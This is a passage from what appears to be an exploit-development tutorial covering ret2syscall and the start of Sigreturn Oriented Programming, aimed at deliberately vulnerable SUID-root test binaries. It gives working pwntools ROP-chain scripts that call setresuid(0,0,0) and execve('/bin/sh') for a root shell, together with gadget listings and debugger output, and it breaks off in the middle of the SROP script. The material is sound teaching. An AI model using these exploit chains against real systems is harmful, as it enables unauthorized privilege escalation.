          <td><code>rt_sigprocmask</code></td>
          <td>Signal blocking/unblocking</td>
      </tr>
      <tr>
          <td><code>poll</code> / <code>select</code> / <code>epoll_wait</code></td>
          <td>Wait for I/O readiness</td>
      </tr>
      <tr>
          <td><code>gettimeofday</code></td>
          <td>Get current time</td>
      </tr>
      <tr>
          <td><code>clock_gettime</code></td>
          <td>More precise time function</td>
      </tr>
      <tr>
          <td>We will be using <code>execve</code> syscall to execute us a shell in our challenge. In some situation we may need to read <code>flag.txt</code> in that case we can use <code>read</code> syscall.</td>
          <td></td>
      </tr>
  </tbody>
</table>
<p><strong>Exploitation</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>section .text
</span></span><span style="display:flex;"><span>global main
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main: 
</span></span><span style="display:flex;"><span>	mov rax, 1;
</span></span><span style="display:flex;"><span>	mov rdi, 1;
</span></span><span style="display:flex;"><span>	mov rsi, string;
</span></span><span style="display:flex;"><span>	mov rdx, 13;
</span></span><span style="display:flex;"><span>	syscall;
</span></span><span style="display:flex;"><span>	mov rax, 0;
</span></span><span style="display:flex;"><span>	mov rdi, 0;
</span></span><span style="display:flex;"><span>	mov rsi, rsp;
</span></span><span style="display:flex;"><span>	sub rsi, 8;
</span></span><span style="display:flex;"><span>	mov rdx, 300;
</span></span><span style="display:flex;"><span>	syscall;
</span></span><span style="display:flex;"><span>	ret;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>        pop rax;
</span></span><span style="display:flex;"><span>        ret;
</span></span><span style="display:flex;"><span>        pop rdi;
</span></span><span style="display:flex;"><span>        ret;
</span></span><span style="display:flex;"><span>        pop rsi;
</span></span><span style="display:flex;"><span>        ret;
</span></span><span style="display:flex;"><span>        pop rdx;
</span></span><span style="display:flex;"><span>        ret;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>section .data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>string: db &#39;Enter Data - &#39;
</span></span><span style="display:flex;"><span>bin_sh: db &#39;/bin/sh&#39;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la ret2syscall            
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16272</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2syscall
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chown root:root ret2syscall
</span></span><span style="display:flex;"><span>sudo chmod u+s,g+s ret2syscall
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>ret2syscall             
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2syscall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stack:      Executable
</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><p>Has no protection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2syscall
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">15446</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./ret2syscall
</span></span></code></pre></div><p>Offset for overflow is <code>8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401020  _start
</span></span><span style="display:flex;"><span>0x0000000000401050  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401060  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401090  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004010d0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401100  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401110  main
</span></span><span style="display:flex;"><span>0x000000000040114c  _fini
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x0000000000401110 &lt;+0&gt;:	mov    eax,0x1
</span></span><span style="display:flex;"><span>   0x0000000000401115 &lt;+5&gt;:	mov    edi,0x1
</span></span><span style="display:flex;"><span>   0x000000000040111a &lt;+10&gt;:	movabs rsi,0x404010
</span></span><span style="display:flex;"><span>   0x0000000000401124 &lt;+20&gt;:	mov    edx,0xd
</span></span><span style="display:flex;"><span>   0x0000000000401129 &lt;+25&gt;:	syscall
</span></span><span style="display:flex;"><span>   0x000000000040112b &lt;+27&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401130 &lt;+32&gt;:	mov    edi,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401135 &lt;+37&gt;:	mov    rsi,rsp
</span></span><span style="display:flex;"><span>   0x0000000000401138 &lt;+40&gt;:	sub    rsi,0x8
</span></span><span style="display:flex;"><span>   0x000000000040113c &lt;+44&gt;:	mov    edx,0x12c
</span></span><span style="display:flex;"><span>   0x0000000000401141 &lt;+49&gt;:	syscall
</span></span><span style="display:flex;"><span>   0x0000000000401143 &lt;+51&gt;:	ret
</span></span><span style="display:flex;"><span>   0x0000000000401144 &lt;+52&gt;:	pop    rax
</span></span><span style="display:flex;"><span>   0x0000000000401145 &lt;+53&gt;:	ret
</span></span><span style="display:flex;"><span>   0x0000000000401146 &lt;+54&gt;:	pop    rdi
</span></span><span style="display:flex;"><span>   0x0000000000401147 &lt;+55&gt;:	ret
</span></span><span style="display:flex;"><span>   0x0000000000401148 &lt;+56&gt;:	pop    rsi
</span></span><span style="display:flex;"><span>   0x0000000000401149 &lt;+57&gt;:	ret
</span></span><span style="display:flex;"><span>   0x000000000040114a &lt;+58&gt;:	pop    rdx
</span></span><span style="display:flex;"><span>   0x000000000040114b &lt;+59&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span><span style="display:flex;"><span>pwndbg&gt; 
</span></span></code></pre></div><p>This time we don&rsquo;t have any function that we can exploit instead we have raw assembly. Here is basic template we always use for our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2syscall&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive
</span></span></code></pre></div><p>From above we know whenever we want to call <code>systemcall</code>, Its number will go to <code>rax</code>, then its arguments will go to  <code>rdi</code>, <code>rsi</code>, <code>rdx</code> and so on. So first we need these registers Address or we can say gadgets. Also we want  address of <code>syscall</code> so we can call it at end.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary ret2syscall
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x0000000000401144 : pop rax ; ret
</span></span><span style="display:flex;"><span>0x00000000004010ed : pop rbp ; ret
</span></span><span style="display:flex;"><span>0x0000000000401146 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x000000000040114a : pop rdx ; ret
</span></span><span style="display:flex;"><span>0x0000000000401148 : pop rsi ; ret
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x0000000000401129 : syscall
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>As we can see we got all gadgets needed in for our exploit. As I said above we are using <code>execve</code> system call for us to get shell and syscall number of <code>execve</code> is 59. Lastly we also need <code>/bin/sh</code> address, I have already shown how to do in previous sections. We got <code>/bin/sh</code> address <code>0x40401d</code> (Use address of binary not libc).</p>
<p>We can run <code>man 2 execve</code> to check for <code>execve</code> arguments. First install man pages using <code>sudo apt install manpages-dev</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>SYNOPSIS
</span></span><span style="display:flex;"><span>       <span style="color:#75715e">#include &lt;unistd.h&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       int execve<span style="color:#f92672">(</span>const char *pathname, char *const _Nullable argv<span style="color:#f92672">[]</span>, char *const _Nullable envp<span style="color:#f92672">[])</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DESCRIPTION
</span></span><span style="display:flex;"><span>       execve<span style="color:#f92672">()</span> executes the program referred to by pathname. This causes the  program  that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and <span style="color:#f92672">(</span>initialized and uninitialized<span style="color:#f92672">)</span> data segments.
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We can see its arguments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">execve</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pathname, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> _Nullable argv[], <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> _Nullable envp[]);
</span></span></code></pre></div><p>We only need to put value in its first arguments which is <code>rdi</code> so it means we only to need to put value in <code>const char *pathname</code> (In our case its <code>/bin/sh</code> ) other remaining Second and Third argument which are <code>rsi</code> and <code>rdx</code> respectively will be set to NULL or 0.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>from pwn import *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context.binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./ret2syscall&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span>0x0000000000401144<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span>0x0000000000401146<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span>0x0000000000401148<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span>0x000000000040114a<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span>0x0000000000401129<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> + pop_rax + pack<span style="color:#f92672">(</span>59<span style="color:#f92672">)</span> + pop_rdi + pack<span style="color:#f92672">(</span>0x40401d<span style="color:#f92672">)</span> + pop_rsi + pack<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> + pop_rdx + pack<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> + syscall
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.interactive<span style="color:#f92672">()</span>
</span></span></code></pre></div><p>We overflowed the return address to inject a crafted ROP chain. This sets up the registers required for the <code>execve</code> syscall using available pop gadgets, then calls the <code>syscall</code> instruction to spawn a shell.</p>
<p>The problem is, despite the binary being SUID-root, the shell drops privileges back to my user (uid=1000) because the kernel automatically clears effective UID in the child shell for security. So we will try to call <code>setuid(0)</code> syscall (or better yet <code>setresuid(0, 0, 0)</code> as shown earlier) before  <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> syscall. That way, the process has UID = 0 when the shell runs, and the shell won‚Äôt drop privileges.</p>
<table>
  <thead>
      <tr>
          <th>Syscall</th>
          <th>Number</th>
          <th>Arguments</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>setuid(uid)</code></td>
          <td>105</td>
          <td><code>rdi = uid</code></td>
      </tr>
      <tr>
          <td><code>setresuid(r,e,s)</code></td>
          <td>117</td>
          <td><code>rdi = ruid</code>, <code>rsi = euid</code>, <code>rdx = suid</code></td>
      </tr>
      <tr>
          <td><code>execve(path, argv, envp)</code></td>
          <td>59</td>
          <td><code>rdi = path</code>, <code>rsi = argv</code>, <code>rdx = envp</code></td>
      </tr>
  </tbody>
</table>
<p><code>setuid(0)</code> sets only the effective UID to root, which is enough in many simple SUID exploits to gain root shell access. However, some systems or shells may still drop privileges if the real or saved UID isn&rsquo;t also root. That&rsquo;s where <code>setresuid(0, 0, 0)</code> is better it sets the real, effective, and saved UIDs all to 0, making the privilege change more complete and reliable. For our exploit, <code>setresuid(0, 0, 0)</code> is the better and safer choice, especially if we want to guarantee that the shell runs fully as root without dropping privileges. So we will use <code>setresuid(0, 0, 0)</code> as good practice:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2syscall&#39;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x401144</span>)
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x401146</span>)
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x401148</span>)
</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x40114a</span>)
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x401129</span>)
</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x40401d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> pop_rax <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">117</span>) <span style="color:#f92672">+</span> pop_rdi <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rsi <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rdx <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> syscall <span style="color:#f92672">+</span> pop_rax <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">59</span>) <span style="color:#f92672">+</span> pop_rdi <span style="color:#f92672">+</span> bin_sh <span style="color:#f92672">+</span> pop_rsi <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rdx <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> syscall
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0xb---sigreturn-oriented-programmingsrop">0XB - Sigreturn Oriented Programming(SROP)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>section .text
</span></span><span style="display:flex;"><span>global main
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main: 
</span></span><span style="display:flex;"><span>	mov rax, 1;
</span></span><span style="display:flex;"><span>	mov rdi, 1;
</span></span><span style="display:flex;"><span>	mov rsi, string;
</span></span><span style="display:flex;"><span>	mov rdx, 13;
</span></span><span style="display:flex;"><span>	syscall;
</span></span><span style="display:flex;"><span>	mov rax, 0;
</span></span><span style="display:flex;"><span>	mov rdi, 0;
</span></span><span style="display:flex;"><span>	mov rsi, rsp;
</span></span><span style="display:flex;"><span>	sub rsi, 8;
</span></span><span style="display:flex;"><span>	mov rdx, 300;
</span></span><span style="display:flex;"><span>	syscall;
</span></span><span style="display:flex;"><span>	ret;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>        pop rax;
</span></span><span style="display:flex;"><span>        ret;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>section .data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>string: db &#39;Enter Data - &#39;
</span></span><span style="display:flex;"><span>bin_sh: db &#39;/bin/sh&#39;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nasm -f elf64 srop.nasm
</span></span><span style="display:flex;"><span>gcc srop.o -o srop -no-pie
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la srop                
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16264</span> Jun <span style="color:#ae81ff">26</span> 17:03 srop
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./srop       
</span></span><span style="display:flex;"><span>Enter Data - aaaaaaaaa
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">26196</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./srop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>srop        
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/srop&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stack:      Executable
</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><p>In techniques like <code>Ret2syscall</code> we needed to fill up arguments using gadgets like <code>pop rdi</code>, <code>ret</code> which we used to find using ROPgadget but it is hard to find these gadgets in particular binary but in this <code>SROP</code> technique we use particular system call which doesn&rsquo;t need any arguments it means we don&rsquo;t need any gadgets and we will get shell also.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401020  _start
</span></span><span style="display:flex;"><span>0x0000000000401050  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401060  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401090  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004010d0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401100  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401110  main
</span></span><span style="display:flex;"><span>0x0000000000401150  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004011c0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004011c8  _fini
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x0000000000401110 &lt;+0&gt;:	mov    eax,0x1
</span></span><span style="display:flex;"><span>   0x0000000000401115 &lt;+5&gt;:	mov    edi,0x1
</span></span><span style="display:flex;"><span>   0x000000000040111a &lt;+10&gt;:	movabs rsi,0x404028
</span></span><span style="display:flex;"><span>   0x0000000000401124 &lt;+20&gt;:	mov    edx,0xd
</span></span><span style="display:flex;"><span>   0x0000000000401129 &lt;+25&gt;:	syscall
</span></span><span style="display:flex;"><span>   0x000000000040112b &lt;+27&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401130 &lt;+32&gt;:	mov    edi,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401135 &lt;+37&gt;:	mov    rsi,rsp
</span></span><span style="display:flex;"><span>   0x0000000000401138 &lt;+40&gt;:	sub    rsi,0x8
</span></span><span style="display:flex;"><span>   0x000000000040113c &lt;+44&gt;:	mov    edx,0x12c
</span></span><span style="display:flex;"><span>   0x0000000000401141 &lt;+49&gt;:	syscall
</span></span><span style="display:flex;"><span>   0x0000000000401143 &lt;+51&gt;:	ret
</span></span><span style="display:flex;"><span>   0x0000000000401144 &lt;+52&gt;:	pop    rax
</span></span><span style="display:flex;"><span>   0x0000000000401145 &lt;+53&gt;:	ret
</span></span><span style="display:flex;"><span>   0x0000000000401146 &lt;+54&gt;:	cs nop WORD PTR <span style="color:#f92672">[</span>rax+rax*1+0x0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p>This time we don&rsquo;t have much gadgets except <code>pop rax</code>. This is where <strong>SROP</strong> comes to play.</p>
<p>The kernel provides a syscall called <code>sigreturn</code> (number <code>15</code> on x86_64) to <strong>restore CPU state</strong> after handling a signal. Signals are <strong>software interrupts</strong> sent to processes to notify them of events. Internally, the kernel expects a <code>sigcontext</code> structure on the stack, which contains:</p>
<ul>
<li><code>rip</code>, <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, etc.</li>
</ul>
<p>When a signal is handled, the OS saves the process&rsquo;s CPU registers and state on the stack. When the signal handler returns, it uses <strong>sigreturn</strong> to restore those registers and continue execution as if the signal never interrupted the program.</p>
<p>This is how Signal handling works in simple diagram:</p>
<p><img src="/img/srop.png" alt="srop.png"></p>
<p><strong>Common signals in Linux</strong>:</p>
<table>
  <thead>
      <tr>
          <th>Signal Name</th>
          <th>Number</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>SIGINT</code></td>
          <td>2</td>
          <td>Interrupt from keyboard (Ctrl+C)</td>
      </tr>
      <tr>
          <td><code>SIGSEGV</code></td>
          <td>11</td>
          <td>Invalid memory reference (segfault)</td>
      </tr>
      <tr>
          <td><code>SIGKILL</code></td>
          <td>9</td>
          <td>Kill signal (cannot be caught)</td>
      </tr>
      <tr>
          <td><code>SIGTERM</code></td>
          <td>15</td>
          <td>Termination request</td>
      </tr>
      <tr>
          <td><code>SIGALRM</code></td>
          <td>14</td>
          <td>Alarm clock timer expired</td>
      </tr>
      <tr>
          <td><code>SIGSTOP</code></td>
          <td>19</td>
          <td>Stop process (cannot be caught)</td>
      </tr>
      <tr>
          <td><code>SIGUSR1</code></td>
          <td>10</td>
          <td>User-defined signal 1</td>
      </tr>
      <tr>
          <td><code>SIGUSR2</code></td>
          <td>12</td>
          <td>User-defined signal 2</td>
      </tr>
  </tbody>
</table>
<p>So whenever we call <code>sigreturn</code> system call, CPU thinks that there is signal handler called and it will put values from stack and put it in registers. So we can control value going into registers coz we are controlling the stack also by our stack overflow technique.</p>
<p>By crafting a fake <code>sigreturn</code> frame on the stack, we can set registers like <code>rip</code>, <code>rsp</code>, <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, etc., to values of their choice.</p>
<p>We have to put <code>31</code> values from stack to registers to use <code>sigreturn</code> system call. So we have to write <code>31</code> in stack.  In most we can write we can write <code>0</code> or <code>NULL</code> but we can&rsquo;t in some cases like in <code>rip</code> register, <code>rsp</code> register. Order also matter doing this process like <code>rdi</code> register are in <code>14</code> number in stack frame (<strong>frame</strong> means block of data in memory or specifically on the stack) so we must follow order.</p>
<p>As always we first need to find offset value of overflow which I have already did it and its <code>8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./srop&#39;</span>)
